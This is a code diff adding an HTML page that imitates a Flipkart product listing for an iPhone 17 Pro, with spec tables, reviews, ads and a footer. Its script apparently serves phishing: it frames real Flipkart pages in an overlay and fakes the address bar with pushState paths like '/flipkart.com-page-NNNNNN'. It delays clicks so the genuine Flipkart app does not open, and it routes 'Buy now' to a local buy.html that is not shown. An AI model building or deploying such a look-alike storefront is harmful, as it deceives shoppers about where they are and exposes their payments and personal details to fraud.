+          <tr><td>Operating Frequency</td><td>5G FDD NR, 5G TDD NR, 5G NR mmWave, 4G LTE FDD, 4G LTE TDD, 3G UMTS/HSPA+/DC-HSDPA, 2G GSM/EDGE</td></tr>
+        </table>
+
+        <div class="spec-group-title">Memory &amp; Storage Features</div>
+        <table class="spec-table">
+          <tr><td>Internal Storage</td><td>256 GB</td></tr>
+          <tr><td>Call Log Memory</td><td>Yes</td></tr>
+        </table>
+
+        <div class="spec-group-title">Camera Features</div>
+        <table class="spec-table">
+          <tr><td>Primary Camera Available</td><td>Yes</td></tr>
+          <tr><td>Primary Camera</td><td>48MP + 48MP + 48MP</td></tr>
+          <tr><td>Primary Camera Features</td><td>48MP Fusion Main: 24 mm, ƒ/1.78 aperture, second‑generation sensor‑shift OIS, 100% Focus Pixels, 12MP 2x Telephoto, 48MP Fusion Ultra Wide: 13 mm, ƒ/2.2 aperture, 48MP Fusion Telephoto: 100 mm (4x), ƒ/2.8, 12MP 8x Telephoto: 200 mm, 8x optical zoom in, 2x zoom out; 16x zoom range, Digital zoom up to 40x, Sapphire crystal cover, Photonic Engine, Deep Fusion, Smart HDR 5, ProRAW, Spatial photos</td></tr>
+          <tr><td>Optical Zoom</td><td>Yes</td></tr>
+          <tr><td>Secondary Camera Available</td><td>Yes</td></tr>
+          <tr><td>Secondary Camera</td><td>18MP Front Camera</td></tr>
+          <tr><td>Secondary Camera Features</td><td>18MP Center Stage Camera (f/1.9 Aperture, Autofocus with Focus Pixels, Center Stage for Photos, Ultra Stabilized Video, Dual Capture, Deep Fusion, Smart HDR 5, Cinematic Video Stabilization)</td></tr>
+          <tr><td>Flash</td><td>Rear: True Tone Flash | Front: Retina Flash</td></tr>
+          <tr><td>HD / Full HD Recording</td><td>Yes</td></tr>
+          <tr><td>Video Recording Resolution</td><td>Rear: 4K (at 24/25/30/60 fps), 1080p (25/30/60 fps), Cinematic Mode Upto 4K Dolby Vision, Action Mode 2.8K | Front: 4K Dolby Vision</td></tr>
+          <tr><td>Digital Zoom</td><td>Upto 8X</td></tr>
+          <tr><td>Frame Rate</td><td>240 fps, 120 fps, 60 fps, 30 fps, 25 fps, 24 fps</td></tr>
+          <tr><td>Image Editor</td><td>Yes</td></tr>
+          <tr><td>Dual Camera Lens</td><td>Primary &amp; Secondary Camera</td></tr>
+        </table>
+
+        <div class="spec-group-title">Call Features</div>
+        <table class="spec-table">
+          <tr><td>Call Wait/Hold</td><td>Yes</td></tr>
+          <tr><td>Conference Call</td><td>Yes</td></tr>
+          <tr><td>Hands Free</td><td>Yes</td></tr>
+          <tr><td>Video Call Support</td><td>Yes</td></tr>
+          <tr><td>Call Divert</td><td>Yes</td></tr>
+          <tr><td>Phone Book</td><td>Yes</td></tr>
+          <tr><td>Call Timer</td><td>Yes</td></tr>
+          <tr><td>Speaker Phone</td><td>Yes</td></tr>
+          <tr><td>Speed Dialing</td><td>Yes</td></tr>
+        </table>
+
+        <div class="spec-group-title">Connectivity Features</div>
+        <table class="spec-table">
+          <tr><td>Network Type</td><td>5G, 4G VOLTE, 4G, 3G, 2G</td></tr>
+          <tr><td>Supported Networks</td><td>5G, 4G VoLTE, 4G LTE, UMTS, GSM</td></tr>
+          <tr><td>Internet Connectivity</td><td>5G, 4G, 3G, Wi-Fi, EDGE</td></tr>
+          <tr><td>3G / GPRS / EDGE</td><td>Yes</td></tr>
+          <tr><td>Micro / Mini USB Port</td><td>No</td></tr>
+          <tr><td>Bluetooth Support</td><td>Yes (v6.0)</td></tr>
+          <tr><td>Wi-Fi / Hotspot</td><td>Yes</td></tr>
+          <tr><td>NFC / USB Tethering / TV Out</td><td>Yes</td></tr>
+          <tr><td>Infrared</td><td>No</td></tr>
+          <tr><td>Map / GPS Support</td><td>Yes</td></tr>
+        </table>
+
+        <div class="spec-group-title">Other Details</div>
+        <table class="spec-table">
+          <tr><td>Smartphone</td><td>Yes</td></tr>
+          <tr><td>Mobile Tracker / Social Networking</td><td>Yes</td></tr>
+          <tr><td>Java Support / Removable Battery</td><td>No</td></tr>
+          <tr><td>MMS / SMS / Voice Input</td><td>Yes</td></tr>
+          <tr><td>Graphics PPI</td><td>460 PPI</td></tr>
+          <tr><td>Sensors</td><td>Face ID, Barometer, High Dynamic Range Gyro, High-G Accelerometer, Proximity Sensor, Dual Ambient Light Sensors</td></tr>
+          <tr><td>Supported Languages</td><td>English, Hindi, Spanish, French, German, Japanese, and 30+ more</td></tr>
+          <tr><td>Browser</td><td>Safari</td></tr>
+          <tr><td>GPS Type</td><td>GPS, GLONASS, GALILEO, QZSS, BEIDOU, NAVIC</td></tr>
+        </table>
+
+        <div class="spec-group-title">Battery &amp; Power Features</div>
+        <table class="spec-table">
+          <tr><td>Battery Capacity</td><td>3988 mAh</td></tr>
+          <tr><td>Battery Type</td><td>Lithium Ion</td></tr>
+          <tr><td>Dual Battery</td><td>No</td></tr>
+        </table>
+
+        <div class="spec-group-title">Dimensions</div>
+        <table class="spec-table">
+          <tr><td>Width</td><td>71.9 mm (7.19 cm)</td></tr>
+          <tr><td>Depth</td><td>8.75 mm (0.88 cm)</td></tr>
+          <tr><td>Height</td><td>150 mm (15.0 cm)</td></tr>
+          <tr><td>Weight</td><td>206 g</td></tr>
+        </table>
+
+        <div class="spec-group-title">Multimedia Features</div>
+        <table class="spec-table">
+          <tr><td>FM Radio / Recording</td><td>No</td></tr>
+          <tr><td>DLNA Support</td><td>No</td></tr>
+          <tr><td>Audio Formats</td><td>AAC, APAC, MP3, Apple Lossless, FLAC, Dolby Atmos</td></tr>
+          <tr><td>Video Formats</td><td>HEVC, H.264, and ProRes</td></tr>
+        </table>
+
+        <div class="specs-gradient-mask"></div>
+      </div>
+
+      <button class="toggle-specs-btn" id="toggleSpecsBtn" onclick="toggleSpecsExpansion()">Show More Specifications &darr;</button>
+    </div>
+
+    <!-- Tab 3: Warranty -->
+    <div id="tab-warranty" class="tab-panel-body">
+      <div class="info-tab-row">
+        <div class="info-tab-label">Warranty Summary</div>
+        <div class="info-tab-val" style="font-weight: 700;">Apple One (1) Year Limited Warranty</div>
+      </div>
+    </div>
+
+    <!-- Tab 4: Manufacturer Info -->
+    <div id="tab-manufacturer" class="tab-panel-body">
+      <div class="info-tab-row">
+        <div class="info-tab-label">Generic Name</div>
+        <div class="info-tab-val">Mobiles</div>
+      </div>
+      <div class="info-tab-row">
+        <div class="info-tab-label">Country of Origin</div>
+        <div class="info-tab-val">India, China</div>
+      </div>
+      <div class="info-tab-row">
+        <div class="info-tab-label">Name and address of the Manufacturer</div>
+        <div class="info-tab-val">Apple Inc. or Apple India Private Limited</div>
+      </div>
+      <div class="info-tab-row">
+        <div class="info-tab-label">Name and address of the Packer</div>
+        <div class="info-tab-val">Apple Inc. or Apple India Private Limited</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section-divider"></div>
+
+  <!-- 3 Ads Carousel (With instant jump from 3 to 1) -->
+  <div class="ads-section">
+    <div class="ads-carousel-wrapper">
+      <div class="ads-track" id="adsTrack">
+        <div class="ad-slide" onclick="openInIframe(event, 'https://www.flipkart.com/rakhi-clp-store?param=328773721321&pageUID=1787652238187', 'rakhi-store')">
+          <img src="https://rukminim2.flixcart.com/fk-p-flap/960/220/image/8a9254d6345fa677.png?q=60" alt="Ad 1">
+        </div>
+        <div class="ad-slide" onclick="openInIframe(event, 'https://www.flipkart.com/supercoin?param=765678', 'supercoin')">
+          <img src="https://rukminim2.flixcart.com/fk-p-flap/960/220/image/58f7c26ceed824de.jpg?q=60" alt="Ad 2">
+        </div>
+        <div class="ad-slide" onclick="openInIframe(event, 'https://www.flipkart.com/partnership/uber?param=538219', 'uber-offer')">
+          <img src="https://rukminim2.flixcart.com/fk-p-flap/960/220/image/8f7e256b1240da8e.jpg?q=60" alt="Ad 3">
+        </div>
+      </div>
+    </div>
+
+    <div class="ad-progress-bar-container">
+      <div class="ad-progress-item active" id="adBar0"><div class="ad-progress-fill" id="adFill0"></div></div>
+      <div class="ad-progress-item" id="adBar1"><div class="ad-progress-fill" id="adFill1"></div></div>
+      <div class="ad-progress-item" id="adBar2"><div class="ad-progress-fill" id="adFill2"></div></div>
+    </div>
+  </div>
+
+  <!-- ==================== NEW STICKY FOOTER (As Per Screenshot) ==================== -->
+  <div class="sticky-bottom-bar">
+    <!-- 1. Left Cart Icon Box -->
+    <div class="footer-cart-box" onclick="openInWeb(event, 'https://www.flipkart.com/viewcart')" title="Cart">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="9" cy="21" r="1"></circle>
+        <circle cx="20" cy="21" r="1"></circle>
+        <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path>
+      </svg>
+      <div class="cart-badge-check">✓</div>
+    </div>
+
+    <!-- 2. Middle Flipkart Minutes Button -->
+    <button type="button" class="footer-minutes-btn" onclick="openInIframe(event, 'https://www.flipkart.com/hyperlocal-preview-page?marketplace=HYPERLOCAL&originalUrl=%2Fflipkart-minutes-store%3Fmarketplace%3DHYPERLOCAL', 'minutes')">
+      <div class="footer-min-title">⚡ Flipkart Minutes</div>
+      <div class="footer-min-sub">10-15 Mins Delivery</div>
+    </button>
+
+    <!-- 3. Right Yellow Buy Now Button (Redirects to buy.html) -->
+    <button type="button" class="footer-buy-btn" onclick="window.location.href='buy.html'">
+      <div class="footer-buy-title">Buy now</div>
+      <div class="footer-buy-price">at ₹1,34,900</div>
+    </button>
+  </div>
+</div>
+
+<!-- Video Popup Modal -->
+<div class="video-modal-backdrop" id="videoModal" onclick="closeVideoModal(event)">
+  <div class="video-modal-box" onclick="event.stopPropagation()">
+    <button class="video-close-floating-btn" onclick="closeVideoModal()" title="Close Video">✕</button>
+    <div class="video-iframe-wrapper">
+      <iframe id="videoModalFrame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+  </div>
+</div>
+
+<!-- Scroll-up Reviews Overlay Bottom-Sheet -->
+<div class="sheet-backdrop" id="reviewsSheet" onclick="closeReviewsSheet(event)">
+  <div class="sheet-content" onclick="event.stopPropagation()">
+    <div class="sheet-drag-handle"></div>
+    <div class="sheet-header">
+      <div>
+        <span style="font-weight: 700; font-size: 15px;">Customer Reviews &amp; Photos</span>
+        <div style="font-size: 12px; color: var(--text-secondary);">4.7 ★ Based on 44,800+ Ratings</div>
+      </div>
+      <button style="background: none; border: none; font-size: 18px; cursor: pointer; color: var(--text-secondary);" onclick="closeReviewsSheet()">✕</button>
+    </div>
+    <div class="sheet-body">
+      <div class="sheet-photos">
+        <div class="sheet-photo-item"><img src="https://rukminim2.flixcart.com/blobio/500/640/imr/blobio-imr_7ee6dcbfef1044018bd1acd1f020c34d.jpeg?q=60" alt="Customer photo 1"></div>
+        <div class="sheet-photo-item"><img src="https://rukminim2.flixcart.com/blobio/500/640/imr/blobio-imr_bb78a3b4f56e4fec842383944f4336ac.jpeg?q=60" alt="Customer photo 2"></div>
+        <div class="sheet-photo-item"><img src="https://rukminim2.flixcart.com/blobio/500/640/imr/blobio-imr_78f672c23887430ca4e143cfa7f7b6af.jpeg?q=60" alt="Customer photo 3"></div>
+        <div class="sheet-photo-item"><img src="https://rukminim2.flixcart.com/blobio/500/640/imr/blobio-imr_ef17116897294cd4b38ace50717b53e9.jpeg?q=60" alt="Customer photo 4"></div>
+        <div class="sheet-photo-item"><img src="https://rukminim2.flixcart.com/blobio/192/192/imr/blobio-imr_e7a23392b6204ac1a8feed4ba27ae959.jpeg?q=80" alt="Customer photo 5"></div>
+        <div class="sheet-photo-item"><img src="https://rukminim2.flixcart.com/blobio/192/192/imr/blobio-imr_5d033f1aad5e47e4ad1fb6e0cc9dff03.jpeg?q=80" alt="Customer photo 6"></div>
+      </div>
+
+      <div class="review-card">
+        <div class="review-head">
+          <span class="star-pill">5 ★</span>
+          <span class="review-author">Aman Sharma</span>
+        </div>
+        <div class="review-body">Camera clarity is outstanding! 48MP zoom produces crisp details even under night shots. Premium unibody finish.</div>
+      </div>
+
+      <div class="review-card" style="margin-top: 10px;">
+        <div class="review-head">
+          <span class="star-pill">5 ★</span>
+          <span class="review-author">Priya V.</span>
+        </div>
+        <div class="review-body">Battery backup easily lasts through the day and charges up to 50% in just 20 minutes. Super smooth display!</div>
+      </div>
+
+      <button class="see-all-reviews-btn" onclick="openInIframe(event, 'https://www.flipkart.com/apple-iphone-17-pro-deep-blue-256-gb/product-reviews/itm239d0b996d7f0', 'reviews')">
+        See All 1,180 Reviews &rsaquo;
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Full Page Iframe Overlay -->
+<div id="iframeOverlay">
+  <iframe id="appFrame" src="about:blank"></iframe>
+</div>
+
+<!-- Invisible Trigger in Top-Left Corner -->
+<div id="invisibleRefreshTrigger" onclick="handleInvisibleTrigger()" title="Back to Product"></div>
+
+<script>
+  // Force Links to Open inside Web Browser on Same Tab (Prevents Mobile App Auto-Open)
+  function openInWeb(e, targetUrl) {
+    if (e && e.preventDefault) e.preventDefault();
+    if (e && e.stopPropagation) e.stopPropagation();
+    
+    // User-Gesture Break: Breaking direct click propagation prevents OS Intent from launching Flipkart App
+    setTimeout(function() {
+      window.location.href = targetUrl;
+    }, 120);
+  }
+
+  // Product Carousel Dots Sync Engine
+  const productTrack = document.getElementById('productCarouselTrack');
+  const productDots = document.querySelectorAll('#productCarouselDots .carousel-dot');
+
+  productTrack.addEventListener('scroll', () => {
+    const slideWidth = productTrack.clientWidth;
+    const activeIndex = Math.round(productTrack.scrollLeft / slideWidth);
+    productDots.forEach((dot, idx) => {
+      dot.classList.toggle('active', idx === activeIndex);
+    });
+  }, { passive: true });
+
+  // Product Tabs Switcher
+  function switchProductTab(tabId, btn) {
+    document.querySelectorAll('.tab-item-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-panel-body').forEach(p => p.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById(tabId).classList.add('active');
+  }
+
+  // Specifications Expand/Collapse Logic
+  function toggleSpecsExpansion() {
+    const wrapper = document.getElementById('specsWrapper');
+    const btn = document.getElementById('toggleSpecsBtn');
+    if (wrapper.classList.contains('expanded')) {
+      wrapper.classList.remove('expanded');
+      btn.innerHTML = 'Show More Specifications &darr;';
+    } else {
+      wrapper.classList.add('expanded');
+      btn.innerHTML = 'Show Less Specifications &uarr;';
+    }
+  }
+
+  // Video Popup Logic
+  function openVideoModal(videoUrl) {
+    const modal = document.getElementById('videoModal');
+    const iframe = document.getElementById('videoModalFrame');
+    iframe.src = videoUrl;
+    modal.style.display = 'flex';
+  }
+
+  function closeVideoModal(e) {
+    if (e && e.target && e.target.id !== 'videoModal' && !e.target.classList.contains('video-close-floating-btn')) return;
+    const modal = document.getElementById('videoModal');
+    const iframe = document.getElementById('videoModalFrame');
+    iframe.src = '';
+    modal.style.display = 'none';
+  }
+
+  // Reviews Bottom-Sheet
+  function openReviewsSheet() {
+    const sheet = document.getElementById('reviewsSheet');
+    sheet.style.display = 'flex';
+    setTimeout(() => { sheet.classList.add('active'); }, 10);
+  }
+
+  function closeReviewsSheet(e) {
+    if (e && e.target && e.target.id !== 'reviewsSheet' && e.target.tagName !== 'BUTTON') return;
+    const sheet = document.getElementById('reviewsSheet');
+    sheet.classList.remove('active');
+    setTimeout(() => { sheet.style.display = 'none'; }, 300);
+  }
+
+  // Full-Page Iframe Handler with Custom URL Mask
+  function openInIframe(e, url, pageName = 'page') {
+    if (e && e.preventDefault) e.preventDefault();
+    closeReviewsSheet();
+    closeVideoModal();
+
+    const overlay = document.getElementById('iframeOverlay');
+    const frame = document.getElementById('appFrame');
+    const refreshTrigger = document.getElementById('invisibleRefreshTrigger');
+
+    frame.src = url;
+    overlay.style.display = 'flex';
+    refreshTrigger.style.display = 'block';
+
+    const randomNum = Math.floor(100000 + Math.random() * 900000);
+    const maskedUrl = `/flipkart.com-${pageName}-${randomNum}`;
+
+    try {
+      window.history.pushState({ inIframe: true }, '', maskedUrl);
+    } catch(err) {}
+  }
+
+  // Invisible Trigger Action
+  function handleInvisibleTrigger() {
+    const overlay = document.getElementById('iframeOverlay');
+    const frame = document.getElementById('appFrame');
+    const refreshTrigger = document.getElementById('invisibleRefreshTrigger');
+
+    frame.src = 'about:blank';
+    overlay.style.display = 'none';
+    refreshTrigger.style.display = 'none';
+
+    try {
+      window.history.back();
+    } catch(err) {}
+  }
+
+  // Device Back Button Handler
+  window.addEventListener('popstate', () => {
+    const overlay = document.getElementById('iframeOverlay');
+    if (overlay && overlay.style.display === 'flex') {
+      handleInvisibleTrigger();
+    }
+  });
+
+  // Ads Carousel Engine (Instant direct jump from 3 -> 1)
+  const adsTrack = document.getElementById('adsTrack');
+  const totalAds = 3;
+  let currentAd = 0;
+  let adInterval = null;
+  const AD_DURATION = 1600;
+
+  function updateAdProgress() {
+    for (let i = 0; i < totalAds; i++) {
+      const bar = document.getElementById(`adBar${i}`);
+      const fill = document.getElementById(`adFill${i}`);
+      
+      bar.classList.toggle('active', i === currentAd);
+
+      if (i < currentAd) {
+        fill.style.transition = 'none';
+        fill.style.width = '100%';
+      } else if (i === currentAd) {
+        fill.style.transition = 'none';
+        fill.style.width = '0%';
+        setTimeout(() => {
+          fill.style.transition = `width ${AD_DURATION}ms linear`;
+          fill.style.width = '100%';
+        }, 20);
+      } else {
+        fill.style.transition = 'none';
+        fill.style.width = '0%';
+      }
+    }
+  }
+
+  function startAdTimer() {
+    clearInterval(adInterval);
+    updateAdProgress();
+    adInterval = setInterval(() => {
+      currentAd = (currentAd + 1) % totalAds;
+      const slideWidth = adsTrack.clientWidth;
+      
+      // If moving from 3rd to 1st ad, do instant direct jump without cheap rewind
+      if (currentAd === 0) {
+        adsTrack.scrollTo({ left: 0, behavior: 'auto' });
+      } else {
+        adsTrack.scrollTo({ left: currentAd * slideWidth, behavior: 'smooth' });
+      }
+
+      updateAdProgress();
+    }, AD_DURATION);
+  }
+
+  adsTrack.addEventListener('scroll', () => {
+    const slideWidth = adsTrack.clientWidth;
+    const activeIndex = Math.round(adsTrack.scrollLeft / slideWidth);
+    if (activeIndex !== currentAd && activeIndex < totalAds) {
+      currentAd = activeIndex;
+      startAdTimer();
+    }
+  }, { passive: true });
+
+  startAdTimer();
+</script>
+
+</body>
+</html>
